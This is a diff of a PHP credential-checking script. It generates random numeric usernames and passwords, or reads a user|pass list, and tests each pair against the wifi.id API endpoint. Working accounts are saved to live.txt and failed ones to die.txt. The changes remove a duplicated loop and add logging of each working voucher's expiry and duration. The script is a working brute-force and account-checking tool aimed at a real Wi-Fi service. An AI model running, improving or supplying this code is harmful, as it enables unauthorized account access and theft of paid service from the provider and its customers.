@@ -9,7 +9,6 @@ $white="\033[1;37m";
 $purple="\033[1;35m";
 $red="\033[1;31m";
 $yellow="\033[1;33m";
- 
 $list = "list.txt";
 function user($total){
 	$abc = "1234567890";
@@ -27,7 +26,6 @@ function pass($total){
 	}
 	return $word;
 }
-
 @system('clear');
 print "\n";
 print "$cyan      .===. (                                \n";
@@ -57,17 +55,6 @@ foreach ($file as $akon => $data) {
 	$split = explode("|", $data);
 	$user = trim($split[0]);
 	$pass = trim($split[1]);
-
-$list = "list.txt";
-echo "$yellow ??$white List Akun : ";
-$filenya = trim(fgets(STDIN));
- 
-$file = file($filenya);
-echo "$yellow **$white Checking list ... \n\n";
-foreach ($file as $akon => $data) {
-    $split = explode("|", $data);
-    $user = trim($split[0]);
-    $pass = trim($split[1]);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://caramel.wifi.id/api/ott/v2');
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -85,20 +72,23 @@ foreach ($file as $akon => $data) {
     $headers[] = 'Cache-Control: max-age=0, no-cache';
     $headers[] = 'Pragma: no-cache';
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    $result = curl_exec($ch);
+     $result = curl_exec($ch);
     echo $result;
     curl_close($ch);
     $json = json_decode($result);
     $act = $json->act;
-    if ($act == "INVALID") {
+	$exp = $json->expire;
+	// $amount = $json->amount;
+	$duration = $json->duration;
+	// $hour = $json->hour;
+	if ($act == "INVALID") {
         echo "$red //$white DIE!$yellow ->$white $user|$pass \n";
         fwrite(fopen("die.txt", "a"), "$user|$pass \n");
-    }else{
-        echo "$okegreen //$white LIVE$yellow ->$white $user|$pass \n";
-        fwrite(fopen("live.txt", "a"), "$user|$pass \n");
-    }
-    sleep(1);
+	}else{
+		echo "$okegreen //$white LIVE until $exp$yellow ->$white $user|$pass \n";
+		fwrite(fopen("live.txt", "a"), "username: $user, password: $pass, Masa aktif $duration hari, hingga $exp WIB. CS:147 \n");
+	}
+	sleep(1);
 }
 echo "\n";
- 
 ?>
